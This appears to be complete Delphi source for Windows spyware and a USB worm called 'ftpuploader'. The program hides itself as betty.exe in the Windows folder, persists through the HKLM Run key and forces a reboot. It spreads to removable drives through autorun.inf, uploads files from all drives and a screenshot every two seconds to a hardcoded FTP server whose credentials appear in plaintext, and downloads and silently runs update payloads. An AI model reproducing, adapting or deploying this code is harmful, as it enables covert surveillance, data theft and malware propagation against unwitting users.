//Completed on Mar 5th,2012
program ftpuploader;

{$i-}

uses
  SysUtils,
  windows,
  IdFTP,
  IdFTPList,
  winsock,
  wininet,
  strutils,
  graphics,
  jpeg,
  forms,
  shlobj,
  registry;

type
  link=^ftpq;
  ftpq=record
      worktype:1..3;
      orgname,orgpath,ftpname,ftppath:string;
      next:link;
  end;

var
  ftp:tidftp;
  homedir,pcname,pcip,foldername,ftpdefault,usbexename,mainprogrampath,usbinfosavepath,mainprogramname:string;
  qhead,qtail:integer;
  ftpworkerhandle,docorehandle,ftpworkerid,docoreid,eagleeyehandle,eagleeyeid:dword;
//=====PROGRAM INIT==================================

//init program and check running environment.
procedure internetaccess;
begin
  repeat
  until InternetGetConnectedState(nil, 0)=true;
end;


procedure addtostartup(exename,savepath:string);
var
  Reg:TRegistry;
begin
  Reg := TRegistry.Create;
  with Reg do
  Try
    RootKey := HKEY_LOCAL_MACHINE;
      if OpenKey('SOFTWARE\MicroSoft\Windows\CurrentVersion\Run',false) then
        Reg.WriteString(exename,savepath);
  finally
    Reg.Free;
  end;
end;

function init:boolean;
var
  bool:boolean;
  ownname:string;
  f:textfile;
begin
  result:=true;
  if fileexists(mainprogrampath) then
    begin
       if not(fileexists(usbinfosavepath)) then begin
      assignfile(f,usbinfosavepath);
      rewrite(f);
      writeln(f,1);
      closefile(f);
    end;
    end
  else
    begin  //Setup on a new computer in USB or repair HDD
      ownname:=paramstr(0);
      copyfile(pchar(ownname),pchar(mainprogrampath),false);
      bool:=SetFileAttributes(pchar(mainprogrampath),FILE_ATTRIBUTE_HIDDEN);
      bool:=SetFileAttributes(pchar(mainprogrampath),FILE_ATTRIBUTE_system);
      assignfile(f,usbinfosavepath);
      rewrite(f);
      writeln(f,1);
      closefile(f);
      try
        addtostartup(mainprogramname,mainprogrampath);
      finally
        winexec(pchar('cmd.exe /c shutdown -r -t 0'),SW_hide);
        result:=false;
     end;
    end;
end;

//===================================================

function ftpinit:boolean;
var
  bool:boolean;
function tryconnect:boolean;
begin
  ftp:=tidftp.create(nil);
  ftp.Host:='grantlj.gicp.net';
  ftp.username:='grantlj';
  ftp.Password:='940414';
  ftp.Port:=21;
  try
    ftp.connect;
    if ftp.Connected then result:=true else begin ftp.Free;result:=false;end;
  except
    ftp.free;
    result:=false;
  end;

end;

begin
  repeat
    sleep(40);
    bool:=tryconnect;
  until bool=true;
  homedir:=ftp.RetrieveCurrentDir;
  ftpdefault:='/'+foldername+'/';
  result:=true;
end;


function ftpdirexists(x:string):boolean;
var
  flag:integer;
begin
  ftp.ChangeDir('/');
  flag:=ftp.size(x+'/EXISTS');
  if flag<>-1 then result:=true else result:=false;
  end;


procedure ftpmakedir(ftpname,ftppath:string);
var
  f:text;
begin
  if not ftpdirexists(ftppath+ftpname) then
    begin
      ftp.changedir(ftppath);
      ftp.MakeDir(ftpname);
      ftp.changedir(ftpname);
      assign(f,'EXISTS');
      rewrite(f);
      close(f);
      ftp.put('EXISTS','EXISTS',false);
      deletefile('EXISTS');
      ftp.ChangeDirUp;
      ftp.changedirup;
      end;
    end;


//FTP 队列上传
procedure ftpworker;
var
  currentdir:string;
  msg1:msg;
  p:link;
begin
  repeat
    if (getmessage(msg1,0,0,0)) and (ftp.connected=true) then begin
    sleep(20);
    p:=link(msg1.wparam);
         with p^ do
          begin
            if worktype=1 then
              begin
                try currentdir:=ftp.RetrieveCurrentDir;except end;
                try ftp.changedir(ftppath);  except end;
                if ftpdirexists(ftpname)=false then try ftpMakeDir(ftpname,ftppath); except end;
                try ftp.ChangeDir(currentdir); except end;
              end;
            if worktype=2 then
              begin
                currentdir:=ftp.RetrieveCurrentDir;
                try ftp.changedir(ftppath); except end;
                if fileexists(orgpath+orgname) then try ftp.Put(orgpath+orgname,ftpname,false); except end;
                try ftp.ChangeDir(currentdir); except end;
             end;
            if worktype=3 then
              begin
                try currentdir:=ftp.RetrieveCurrentDir;except end;
                try ftp.changedir(ftppath);except end;
                if fileexists(orgpath+orgname) then  begin try ftp.Put(orgpath+orgname,ftpname,false);deletefile(pchar(orgpath+orgname));except end; end;
                try ftp.ChangeDir(currentdir);except end;
            end;
        end;

    end
  else ftpinit;
  until 1=2;
end;

//FTP EXTRA FUNCTION END!!!!
//====================================================
//====================================================



function getname: String;
var
  s:array[0..255] Of Char;
  u:cardinal;
begin
  u:=255;
  GetcomputerName(@s, u);
  Result:=s;
end;

function GetMacAddress(AServerName: string): string;
type
TNetTransportEnum = function(pszServer: PWideChar;
Level: DWORD;
var pbBuffer: pointer;
PrefMaxLen: LongInt;
var EntriesRead: DWORD;
var TotalEntries: DWORD;
var ResumeHandle: DWORD): DWORD; stdcall;

TNetApiBufferFree = function(Buffer: pointer): DWORD; stdcall;

PTransportInfo = ^TTransportInfo;
TTransportInfo = record
quality_of_service: DWORD;
number_of_vcs: DWORD;
transport_name: PWChar;
transport_address: PWChar;
wan_ish: boolean;
end;

var
E, ResumeHandle,
EntriesRead,
TotalEntries: DWORD;
FLibHandle: THandle;
sMachineName,
sMacAddr,
Retvar: string;
pBuffer: pointer;
pInfo: PTransportInfo;
FNetTransportEnum: TNetTransportEnum;
FNetApiBufferFree: TNetApiBufferFree;
pszServer: array[0..128] of WideChar;
i, ii, iIdx: integer;
begin
sMachineName := trim(AServerName);
Retvar := '00-00-00-00-00-00';

// Add leading \\ if missing
if (sMachineName <> '') and (length(sMachineName) >= 2) then
begin
if copy(sMachineName, 1, 2) <> '\\' then
sMachineName := '\\' + sMachineName
end;

// Setup and load from DLL
pBuffer := nil;
ResumeHandle := 0;
FLibHandle := LoadLibrary('NETAPI32.DLL');

// Execute the external function
if FLibHandle <> 0 then
begin
@FNetTransportEnum := GetProcAddress(FLibHandle, 'NetWkstaTransportEnum');
@FNetApiBufferFree := GetProcAddress(FLibHandle, 'NetApiBufferFree');
E := FNetTransportEnum(StringToWideChar(sMachineName, pszServer, 129), 0,
pBuffer, -1, EntriesRead, TotalEntries, Resumehandle);

if E = 0 then
begin
pInfo := pBuffer;

// Enumerate all protocols - look for TCPIP
for i := 1 to EntriesRead do
begin
if pos('TCPIP', UpperCase(pInfo^.transport_name)) <> 0 then
begin
// Got It - now format result 'xx-xx-xx-xx-xx-xx'
iIdx := 1;
sMacAddr := pInfo^.transport_address;

for ii := 1 to 12 do
begin
Retvar[iIdx] := sMacAddr[ii];
inc(iIdx);
if iIdx in [3, 6, 9, 12, 15] then
inc(iIdx);
end;
end;

inc(pInfo);
end;
if pBuffer <> nil then
FNetApiBufferFree(pBuffer);
end;

try
FreeLibrary(FLibHandle);
except
// Silent Error
end;
end;

Result := Retvar;
end;





//搜索线程！
procedure docore(uploadpath:string);
var
  errormode,usbnum:integer;
  i:char;
  disk,uploadpath2,usbinfosavepath:string;

function addtoque(orgname,orgpath,ftpname,ftppath:string;worktype:integer):boolean;
var
  quetmp:link;
  bool:boolean;
begin
     new(quetmp);
     quetmp^.worktype:=worktype;
     quetmp^.orgname:=orgname;
     quetmp^.orgpath:=orgpath;
     quetmp^.ftpname:=ftpname;
     quetmp^.ftppath:=ftppath;
     repeat
      bool:=postthreadmessage(ftpworkerid,0,longint(quetmp),0);
     until bool=true;
     sleep(10);
     result:=true;
end;


function getusbnum(filepath:string):integer;
var
  x:integer;
  f:textfile;
begin
  if fileexists(filepath) then begin
  assignfile(f,filepath);
  reset(f);
  readln(f,x);
  closefile(f);
  rewrite(f);
  writeln(f,x+1);
  closefile(f);
  result:=x;
  end
  else begin
    assignfile(f,filepath);
    rewrite(f);
    writeln(f,1);
    closefile(f);
    result:=1;
end;
end;


procedure usbsetup(path:string);
var
  bool:boolean;
  f:textfile;

begin
  copyfile(pchar(paramstr(0)),pchar(path+usbexename),false);
  assignfile(f,path+'autorun.inf');
  rewrite(f);
  writeln(f,'[autorun]');
  writeln(f,'open='+usbexename);
  closefile(f);
  bool:=SetFileAttributes(pchar(path+'autorun.inf'),FILE_ATTRIBUTE_HIDDEN);
  bool:=SetFileAttributes(pchar(path+'autorun.inf'),FILE_ATTRIBUTE_System);
end;

//Check Exist
function checkexist(disk:string):boolean;
var
  bool:boolean;
  s,filepath,savedtime:string;
  f:textfile;
begin
  s:=formatdatetime('yyyy/mm/dd',now);
  filepath:=disk+'copy.t';
  if fileexists(filepath) then
  begin
    assignfile(f,filepath);
    reset(f);
    readln(f,savedtime);
    closefile(f);
   if savedtime=s then result:=true else begin rewrite(f);writeln(f,s);closefile(f);result:=false;end
  end
  else
    begin
      assignfile(f,filepath);
      rewrite(f);
      writeln(f,s);
      closefile(f);
      result:=false;
    end;
end;

function isthatone(filepath:string):boolean;           //tell whether it is a needed one?!
var
  x:string;
begin
  x:=extractfileext(filepath);
  //'doc','docx','xls','xlsx','ppt','pptx','txt','jpg','bmp'
 { if ((x='.doc') or (x='.docx') or (x='.xls') or (x='.xlsx') or (x='.ppt') or (x='.pptx') or (x='.txt') or (x='.jpg') or (x='.bmp') or (x='.pdf')) then }
   if (x='.index') or (x='.cf') then
    result:=true
  else
    result:=false;
end;


//Copyer
procedure copyer(source,dest:string);
var
  bool:boolean;
  flag:integer;
  folder:tsearchrec;
begin
  sleep(10);
  flag:=findfirst(source+'*.*',faanyfile,folder);
  while flag=0 do
    begin
      if (Folder.Attr and FaDirectory <> FaDirectory) then //Add get particular file here!
        begin
         if (isthatone(source+folder.name)=true) then addtoque(folder.name,source,folder.name,dest,2);   {source,dest,workmode}
         Flag:= FindNext(Folder);
        end
   else
     begin
       if (Folder.Name <> '.') and (not AnsiContainsText(Folder.Name,'..'))
  then begin
         addtoque(folder.name,source,folder.name,dest,1);
         Copyer(source+Folder.Name + '\',dest+folder.name+'\');
         flag:= FindNext(Folder);
 end else flag:=FindNext(Folder);
 end;
 end; //while
end;

//Do core main;
begin
EConvertError.Create('Not a valid drive ID');
    ErrorMode:=SetErrorMode(SEM_FailCriticalErrors);


repeat
    for i:='Z' downto 'C' do
      begin
        disk:=i+':\';
        if (DiskSize(Ord(I) - $40) <> -1) and (checkexist(disk)=false) then
          begin
            if (getdrivetype(pchar(disk))=drive_fixed)  then
             begin //DO HDD copy
               uploadpath2:=ftpdefault+'HardDisk_'+i;
               addtoque(disk,'',uploadpath2,'',1); //orgname orgpath ftpname ftppath
               copyer(disk,uploadpath2+'/');
             end
            else
              begin
                if getdrivetype(pchar(disk))=drive_removable then
                  begin //DO USB SETUP and COPY
                    usbsetup(disk);
                    usbnum:=getusbnum(usbinfosavepath);
                    uploadpath2:=ftpdefault+'USBDisk_'+inttostr(usbnum);
                    addtoque(disk,'',uploadpath2,'',1);
                    copyer(disk,uploadpath2+'/');
                  end;
              end;
       end;
  end;
  sleep(2000);
  until 1=2;
end;

//屏幕监控！！！！
procedure eagleeye;
var
  i:integer;
  systemdir:string;
function addtoque(orgname,orgpath,ftpname,ftppath:string;worktype:integer):boolean;
var
 quetmp:link;
 bool:boolean;
begin
  new(quetmp);
  quetmp^.worktype:=worktype;
  quetmp^.orgname:=orgname;
  quetmp^.orgpath:=orgpath;
  quetmp^.ftpname:=ftpname;
  quetmp^.ftppath:=ftppath;
  repeat
    bool:=postthreadmessage(ftpworkerid,0,longint(quetmp),0);
  until bool=true;
  sleep(10);
  result:=true;
end;

procedure getscreenshot(dest:string);
var
  jpg:tjpegimage;
  DC: HDC;
  cvs: TCanvas;
  bmp:tbitmap;
begin
  jpg:=Tjpegimage.Create;
  bmp:=tbitmap.create;
  bmp.Height:=screen.height;
  bmp.width:=screen.Width;
   DC := GetDC(0);
  cvs := TCanvas.Create;
  cvs.Handle := DC;
  bmp.Canvas.CopyRect(Screen.DesktopRect,cvs,Screen.DesktopRect);
  jpg.Assign(Bmp);
  jpg.CompressionQuality:=80;
  jpg.Compress;
  jpg.SaveToFile(dest);
  ReleaseDC(0, DC);
  cvs.Free;
  jpg.Free;
  bmp.free;
end;

begin
  systemdir:=GetEnvironmentVariable('WINDIR')+'\';
  repeat
    for i:=1 to 150 do
      begin
        getscreenshot(systemdir+inttostr(i)+'.jpg');
        addtoque(inttostr(i)+'.jpg',systemdir,inttostr(i)+'.jpg',ftpdefault+'screenshots/',3);
        sleep(2000);
      end;
  until 1=2;
end;

procedure ftpupdate;
var
  curdir:string;
  programdir:string;
  f:text;
  downloadfilename,savefilename:string;
begin
   curdir:=ftp.RetrieveCurrentDir;
   programdir:=ExtractFilePath(ParamStr(0));
   ftp.changedir(homedir);
   if ftp.size('update.dat')<>-1 then ftp.get('update.dat','update.dat',true);
   if fileexists('update.dat') then
     begin
       assign(f,'update.dat');
       reset(f);
       readln(f,downloadfilename);
       readln(f,savefilename);
       close(f);
       if ftp.size(downloadfilename)<>-1 then begin ftp.get(downloadfilename,savefilename,true); if fileexists(savefilename) then winexec(pchar('cmd.exe /c'+programdir+savefilename),sw_hide);
   end;
   ftp.changedir(curdir);
end;
end;
//================================================
//Main
begin
  mainprogrampath:=GetEnvironmentVariable('WINDIR')+'\'+'betty.exe';
  usbexename:='betty.exe';mainprogramname:='betty.exe';
  usbinfosavepath:=getenvironmentvariable('WINDIR')+'\'+'usbinfo.dat';
  if init then
  begin
   internetaccess;
   pcname:=getname;
   pcip:=getmacaddress(pcname);
   foldername:=pcname+'_'+pcip;
   ftpinit;
   ftpupdate;
   ftpmakedir(foldername,'');
   ftpmakedir('screenshots',ftpdefault);
   docorehandle:=createthread(nil,0,@docore,@foldername,0,docoreid);
   ftpworkerhandle:=createthread(nil,0,@ftpworker,nil,0,ftpworkerid);
   eagleeyehandle:=createthread(nil,0,@eagleeye,nil,0,eagleeyeid);
  repeat
    sleep(10000);
  until 1=2;
  end;
end.
